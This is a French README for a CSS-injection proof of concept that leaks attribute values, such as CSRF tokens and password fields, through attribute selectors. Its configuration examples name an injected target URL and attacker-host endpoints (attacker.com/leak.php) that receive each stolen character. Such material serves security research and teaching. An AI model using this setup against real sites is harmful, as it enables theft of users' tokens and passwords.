# PoC - CSS Injection : Sélecteur d'attributs

__Read this in other languages:__ [English](README.md), [Français](README.fr.md)

## Description

PoC d'exploitation d'une injection CSS en utilisant les sélecteurs d'attributs afin de récupérer la valeur d'un attribut d'un élément HTML.

## Prérequis

- Le site vulnérable doit pouvoir être iframé, voir entêtes HTTP `X-Frame-Options` et `frame-ancestors`.
- Il existe certaines limites lorsque la valeur à récupérer commence par un chiffre. La valeur de sélection doit alors être entourée par de guillemets simples ou doubles et l'exploitation peut ne pas être possible dans le cas ou ces caractères sont filtrés par l'application.

## Configuration

Avant d'utiliser le PoC, configurer les valeurs suivantes :

```
/* ==== CONFIG ==== */
// URL complète de l'application vulnérable
const RURL = "http://192.168.56.101/css-injection/partie1/css-injection-element-hidden.php?color=red;}";  

// URL de la machine de l'attaquant permettant de connaitre les caractères déjà identifiés
const LURL_KNOWNCHARS = "http://192.168.56.102/css-injection/partie1/poc/knownChars.php";

// URL de la machine de l'attaquant permettant d'indiquer un nouveau caractère identifié
const LURL_LEAKCHAR = "http://192.168.56.102/css-injection/partie1/poc/leak.php?char=";

// Nom de l'élément HTML ciblé
const HTML_ELEMENT_NAME = "input";

// Nom de l'attribut HTML ciblé
const HTML_ATTRIBUTE_NAME = "name";

// Valeur NAME de l'attribut HTML ciblé
const HTML_ATTRIBUTE_VALUE = "csrf-token";

// True si le champs ciblé est de type "hidden" (utilisation des combinateurs CSS ~*)
const isHiddenTypeElement = true;

// Lorsque les caractères "'" et """ sont filtrés par l'application il n'est pas possible de récupérer une valeur commençant par un chiffre
const isQuoteFiltered = true;
```

## Utilisation

### Récupération d'une valeur d'un champ de type password

```javascript
const RURL = "http://vulnerable.com/targets/password.php?color=red;}";  
const LURL_KNOWNCHARS = "http://attacker.com/knownChars.php";
const LURL_LEAKCHAR = "http://attacker.com/leak.php?char=";
const HTML_ELEMENT_NAME = "input";
const HTML_ATTRIBUTE_NAME = "name";
const HTML_ATTRIBUTE_VALUE = "password";
const isHiddenTypeElement = false;
const isQuoteFiltered = false;
```

### Récupération d'une valeur d'un champ de type hidden

```javascript
const RURL = "http://vulnerable.com/targets/password.php?color=red;}";  
const LURL_KNOWNCHARS = "http://attacker.com/knownChars.php";
const LURL_LEAKCHAR = "http://attacker.com/leak.php?char=";
const HTML_ELEMENT_NAME = "input";
const HTML_ATTRIBUTE_NAME = "name";
const HTML_ATTRIBUTE_VALUE = "csrf-token";
const isHiddenTypeElement = true;
const isQuoteFiltered = false;
```

## Démo

### Récupération d'une valeur d'un champ de type password

![](https://github.com/Sharpforce/PoC-CSS-injection-with-attribute-selector/blob/master/Resources/password.gif)

### Récupération d'une valeur d'un champ de type hidden

![](https://github.com/Sharpforce/PoC-CSS-injection-with-attribute-selector/blob/master/Resources/hidden.gif)